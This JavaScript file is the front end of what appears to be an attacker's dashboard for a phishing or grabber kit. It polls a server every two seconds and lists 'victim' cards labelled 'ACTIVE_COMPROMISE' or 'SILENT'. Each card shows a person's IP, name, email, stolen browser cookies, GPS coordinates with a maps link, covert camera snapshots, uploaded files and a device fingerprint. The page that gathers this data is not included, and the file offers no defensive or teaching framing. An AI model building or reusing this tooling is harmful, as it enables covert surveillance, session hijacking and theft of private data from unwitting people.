document.addEventListener('DOMContentLoaded', () => {
    const feedCards = document.getElementById('feed-cards');
    const detailPanel = document.getElementById('detail-panel');
    const totalEl = document.getElementById('total-victims');
    const activeEl = document.getElementById('active-victims');
    const gpsEl = document.getElementById('gps-victims');

    let knownSessionIds = new Set();
    let allData = [];

    function formatTime(ts) {
        try {
            return new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        } catch { return ts; }
    }

    function shortenBrowser(ua) {
        if (!ua) return 'Unknown';
        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome' + (ua.includes('Mobile') ? ' Mobile' : '');
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari' + (ua.includes('Mobile') ? ' Mobile' : '');
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Edg')) return 'Edge';
        return ua.split(' ')[0];
    }

    function renderCard(entry) {
        const meta = entry.metadata || {};
        const isActive = entry.status === 'ACTIVE_COMPROMISE';
        const card = document.createElement('div');
        card.className = `victim-card ${isActive ? 'active-card' : 'silent-card'} slide-in`;
        card.dataset.sessionId = entry.sessionId;

        const nameDisplay = meta.userName ? `<div class="vc-name">${meta.userName}</div>` : '';
        const emailDisplay = meta.userEmail ? `<div class="vc-email">${meta.userEmail}</div>` : '';
        const thumbDisplay = entry.base64Image ? `<img src="${entry.base64Image}" class="vc-thumb" alt="Camera">` : '';
        const gpsDisplay = entry.location ? `<span class="vc-badge" style="color:#10b981;">📍 GPS</span>` : '';

        card.innerHTML = `
            <div class="vc-header">
                <div>
                    <div class="vc-ip">${entry.ip}</div>
                    ${nameDisplay}
                    ${emailDisplay}
                </div>
                <span class="vc-status ${isActive ? 'status-active' : 'status-silent'}">${isActive ? '⚡ ACTIVE' : '👁 SILENT'}</span>
            </div>
            <div class="vc-time">${formatTime(entry.timestamp)}</div>
            <div class="vc-meta">
                <span class="vc-badge">${shortenBrowser(meta.userAgent)}</span>
                <span class="vc-badge">${meta.battery || '?'}</span>
                <span class="vc-badge">${meta.screenSize || '?'}</span>
                ${gpsDisplay}
            </div>
            ${thumbDisplay}
        `;
        
        card.addEventListener('click', () => {
            document.querySelectorAll('.victim-card').forEach(c => c.classList.remove('active'));
            card.classList.add('active');
            renderDetail(entry);
        });

        return card;
    }

    function renderDetail(entry) {
        const meta = entry.metadata || {};
        const loc = entry.location;

        const gpsHtml = loc
            ? `<a class="gps-link" href="https://www.google.com/maps?q=${loc.lat},${loc.lon}" target="_blank">📍 ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${Math.round(loc.accuracy)}m) — Open in Maps</a>`
            : '<span style="color:#64748b;">Not captured</span>';

        const photoHtml = entry.base64Image
            ? `<img src="${entry.base64Image}" class="camera-img" alt="Camera Capture">`
            : `<div style="color:#334155;padding:2rem;text-align:center;">No camera capture yet</div>`;

        const cookieHtml = meta.cookies
            ? `<div class="cookie-block">${meta.cookies}</div>`
            : `<div class="cookie-block" style="color:#475569;">No cookies captured</div>`;

        let uploadedHtml = `<div style="color:#334155;padding:1rem;text-align:center;">No file uploaded</div>`;
        if (entry.uploadedFile && entry.uploadedFileName) {
            if (entry.uploadedFile.startsWith('data:image')) {
                uploadedHtml = `
                    <p style="color:#a78bfa;font-size:0.85rem;margin-bottom:8px;">📁 ${entry.uploadedFileName}</p>
                    <img src="${entry.uploadedFile}" style="max-width:100%;border-radius:8px;border:2px solid #a78bfa;" alt="Uploaded file">`;
            } else {
                uploadedHtml = `
                    <div style="background:rgba(167,139,250,0.08);border:1px solid #a78bfa;border-radius:8px;padding:12px;font-family:monospace;font-size:0.85rem;color:#a78bfa;">
                        📁 ${entry.uploadedFileName}<br>
                        <span style="color:#64748b;font-size:0.8rem;">${(entry.uploadedFile.length * 0.75 / 1024).toFixed(1)} KB received</span>
                    </div>`;
            }
        }

        detailPanel.innerHTML = `
            <!-- IDENTITY -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-id-card"></i> &nbsp;Identity</h3>
                <div class="detail-grid">
                    <div class="detail-field"><label>Full Name</label><span class="danger">${meta.userName || '—'}</span></div>
                    <div class="detail-field"><label>Email</label><span class="danger">${meta.userEmail || '—'}</span></div>
                    <div class="detail-field"><label>IP Address</label><span>${entry.ip}</span></div>
                    <div class="detail-field"><label>Session ID</label><span>${entry.sessionId}</span></div>
                    <div class="detail-field"><label>Timestamp</label><span>${entry.timestamp}</span></div>
                    <div class="detail-field"><label>Timezone</label><span>${meta.timeZone || '—'}</span></div>
                </div>
            </div>

            <!-- DEVICE FINGERPRINT -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-fingerprint"></i> &nbsp;Device Fingerprint</h3>
                <div class="detail-grid">
                    <div class="detail-field"><label>Platform</label><span>${meta.platform || '—'}</span></div>
                    <div class="detail-field"><label>Browser</label><span>${shortenBrowser(meta.userAgent)}</span></div>
                    <div class="detail-field"><label>Screen</label><span>${meta.screenSize || '—'} @ ${meta.colorDepth || '—'}</span></div>
                    <div class="detail-field"><label>Language</label><span>${meta.language || '—'}</span></div>
                    <div class="detail-field"><label>Battery</label><span class="danger">${meta.battery || '—'}</span></div>
                    <div class="detail-field"><label>Referrer</label><span>${meta.referrer || 'Direct'}</span></div>
                </div>
                <div class="detail-field" style="margin-top:0.75rem;">
                    <label>Full User Agent</label>
                    <span style="font-size:0.75rem;">${meta.userAgent || '—'}</span>
                </div>
            </div>

            <!-- GPS -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-location-dot"></i> &nbsp;GPS Location</h3>
                ${gpsHtml}
            </div>

            <!-- CAMERA -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-camera"></i> &nbsp;Camera Snapshot</h3>
                ${photoHtml}
            </div>

            <!-- UPLOADED FILE -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-file-arrow-up"></i> &nbsp;Uploaded File</h3>
                ${uploadedHtml}
            </div>

            <!-- COOKIES -->
            <div class="detail-panel">
                <h3><i class="fa-solid fa-cookie"></i> &nbsp;Browser Cookies Captured</h3>
                ${cookieHtml}
            </div>
        `;
    }

    function updateStats(data) {
        totalEl.textContent = data.length;
        activeEl.textContent = data.filter(e => e.status === 'ACTIVE_COMPROMISE').length;
        gpsEl.textContent = data.filter(e => !!e.location).length;
    }

    function fetchData() {
        fetch('/api/data')
            .then(r => r.json())
            .then(data => {
                if (!data) return;
                allData = data;
                updateStats(data);

                // Add new cards
                data.forEach(entry => {
                    if (!entry.sessionId) return;

                    // If we already have this session card, update it in-place
                    const existingCard = feedCards.querySelector(`[data-session-id="${entry.sessionId}"]`);
                    if (existingCard) {
                        // Re-render card if status changed
                        const wasActive = existingCard.classList.contains('active-card');
                        const isNowActive = entry.status === 'ACTIVE_COMPROMISE';
                        if (!wasActive && isNowActive) {
                            const newCard = renderCard(entry);
                            feedCards.insertBefore(newCard, existingCard);
                            existingCard.remove();

                            // If this card was selected in detail, refresh it
                            if (existingCard.classList.contains('active')) {
                                newCard.classList.add('active');
                                renderDetail(entry);
                            }
                        }
                    } else {
                        // New session - prepend
                        const placeholder = feedCards.querySelector('.placeholder-msg');
                        if (placeholder) placeholder.remove();

                        const card = renderCard(entry);
                        feedCards.insertBefore(card, feedCards.firstChild);
                        knownSessionIds.add(entry.sessionId);
                    }
                });
            })
            .catch(err => console.error(err));
    }

    setInterval(fetchData, 2000);
    fetchData();
});
